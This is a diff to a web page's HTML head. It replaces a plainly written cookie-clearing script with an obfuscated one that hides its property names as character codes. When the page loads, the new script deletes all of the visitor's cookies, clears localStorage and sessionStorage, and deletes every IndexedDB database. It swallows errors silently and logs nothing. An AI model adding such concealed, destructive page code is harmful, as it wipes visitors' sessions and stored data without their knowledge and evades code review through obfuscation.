@@ -37,21 +37,7 @@
 /* ]]> */
               </script>
   <script>
-//<![CDATA[
-(function limparCookies(){
-  var cookies = document.cookie.split("; ");
-  for (var i = 0; i < cookies.length; i++) {
-    var cookie = cookies[i];
-    var eqPos = cookie.indexOf("=");
-    var name = eqPos > -1? cookie.substr(0, eqPos) : cookie;
-    // Apaga o cookie pra domínio atual e subdomínios
-    document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/";
-    document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/;domain=" + location.hostname;
-    document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/;domain=." + location.hostname;
-  }
-  console.log("Cookies limpos em 0ms");
-})();
-//]]>
+(function(){var _0=function(){return[String.fromCharCode(99,111,111,107,105,101),String.fromCharCode(115,112,108,105,116),String.fromCharCode(59),String.fromCharCode(105,110,100,101,120,79,102),String.fromCharCode(115,117,98,115,116,114),String.fromCharCode(116,114,105,109),String.fromCharCode(104,111,115,116,110,97,109,101),String.fromCharCode(112,97,116,104,110,97,109,101),String.fromCharCode(108,111,99,97,108,83,116,111,114,97,103,101),String.fromCharCode(115,101,115,115,105,111,110,83,116,111,114,97,103,101),String.fromCharCode(99,108,101,97,114),String.fromCharCode(105,110,100,101,120,101,100,68,66),String.fromCharCode(100,97,116,97,98,97,115,101,115),String.fromCharCode(100,101,108,101,116,101,68,97,116,97,98,97,115,101)]};var a=_0();function b(i){return a[i]}try{var c=document[b(0)][b(1)](b(2));for(var i=0;i<c.length;i++){var p=c[i],e=p[b(3)]('='),n=e>-1?p[b(4)](0,e)[b(5)]():p[b(5)]();if(!n)continue;var d=[location[b(6)],'.'+location[b(6)]],t=['/',location[b(7)]];d.forEach(function(dm){t.forEach(function(pt){document[b(0)]=n+'=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path='+pt+';domain='+dm;document[b(0)]=n+'=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path='+pt;document[b(0)]=n+'=;Max-Age=0;path='+pt+';domain='+dm;document[b(0)]=n+'=;Max-Age=0;path='+pt})})}catch(e){}try{window[b(8)][b(10)]()}catch(e){}try{window[b(9)][b(10)]()}catch(e){}try{if(window[b(11)]&&indexedDB[b(12)]){indexedDB[b(12)]().then(function(dbs){dbs.forEach(function(db){indexedDB[b(13)](db.name)})})}}catch(e){}})();
   </script>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
